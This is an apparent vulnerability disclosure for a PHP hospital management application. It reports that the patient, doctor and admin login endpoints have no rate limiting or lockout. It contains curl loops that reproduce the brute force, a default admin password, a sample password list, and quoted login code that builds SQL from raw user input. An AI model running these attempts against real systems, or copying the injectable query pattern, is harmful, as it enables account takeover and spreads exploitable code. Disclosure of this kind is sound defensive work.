### Title

Authentication endpoints allow unlimited brute-force attempts; no rate limiting, lockout, or CAPTCHA

### Summary

The three login endpoints (`func.php`, `func1.php`, `func3.php`) accept an unlimited number of incorrect credentials before locking the account. Ten consecutive failed logins for the receptionist account were confirmed to return HTTP 200 each without any account-lockout response. Because the login handlers are not protected by a rate limiter and the dashboard endpoints are reachable without authentication (CVE-09), an attacker can iterate over a small password list and brute-force every seeded account in seconds.

### Affected Version

Commit: `bc3bb9cbadfb2b1afb36660b5119ff42a03a7a25`

### Vulnerability Type

Improper Restriction of Excessive Authentication Attempts (CWE-307)

### Affected Code

File: `func.php`

```php
if(isset($_POST['patsub'])){
    $email=$_POST['email'];
    $password=$_POST['password2'];
    $query="select * from patreg where email='$email' and password='$password';";
    $result=mysqli_query($con,$query);
    if(mysqli_num_rows($result)==1){
        // success
    } else {
        echo "<script>alert('Invalid Username or Password. Try Again!');</script>";
    }
}
```

File: `func1.php`

```php
if(isset($_POST['docsub1'])){
    $dname=$_POST['username3'];
    $dpass=$_POST['password3'];
    $query="select * from doctb where username='$dname' and password='$dpass';";
    $result=mysqli_query($con,$query);
    // ...
}
```

File: `func3.php`

```php
if(isset($_POST['adsub'])){
    $username=$_POST['username1'];
    $password=$_POST['password2'];
    $query="select * from admintb where username='$username' and password='$password';";
    $result=mysqli_query($con,$query);
    // ...
}
```

### Root Cause

There is no rate limiter, no per-account counter, no IP throttling, no CAPTCHA, and no temporary lockout. The login handlers run as soon as the `$_POST` parameter is present, regardless of the number of previous failed attempts.

### Steps to Reproduce

1. Deploy the application and set `BASE_URL`.

```bash
BASE_URL="http://hms.localhost"
```

2. Send 10 consecutive authentication failures against the receptionist account. None of them return a lockout response.

```bash
for i in 1 2 3 4 5 6 7 8 9 10; do
    curl -s -o /dev/null -w "Attempt $i: HTTP %{http_code}\n" \
      "$BASE_URL/func3.php" \
      --data-urlencode "adsub=1" \
      --data-urlencode "username1=admin" \
      --data-urlencode "password2=WRONG"
done
```

```text
Attempt 1: HTTP 200
Attempt 2: HTTP 200
Attempt 3: HTTP 200
Attempt 4: HTTP 200
Attempt 5: HTTP 200
Attempt 6: HTTP 200
Attempt 7: HTTP 200
Attempt 8: HTTP 200
Attempt 9: HTTP 200
Attempt 10: HTTP 200
```

3. Confirm that the correct credential is still accepted afterwards (no lockout).

```bash
curl -sS -i "$BASE_URL/func3.php" \
  --data-urlencode "adsub=1" \
  --data-urlencode "username1=admin" \
  --data-urlencode "password2=admin123" | head -10
```

```text
HTTP/1.1 302 Found
Location: admin-panel1.php
```

4. The same pattern applies to `func.php` (patient login) and `func1.php` (doctor login). A brute-force attacker can iterate over a 1-2 KB password list (e.g. `admin123`, `ashok123`, `kishan123`, `password`, `123456`, `hospital`) and compromise every account in the system.

### Impact

The lack of rate limiting allows:

- Online brute-force attacks against every receptionist/doctor/patient account.
- Credential-stuffing attacks using the passwords leaked by the same application's `patientsearch.php`/`doctorsearch.php` endpoints (CVE-12/13).
- Aggressive password-spraying attacks across the entire user base.

Combined with the default credentials (CVE-11) and the missing authentication on the dashboards (CVE-09), the brute-force surface is one of the simplest paths to full administrative compromise.

### CVSS 3.1

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
Score: 9.1 (Critical)
```
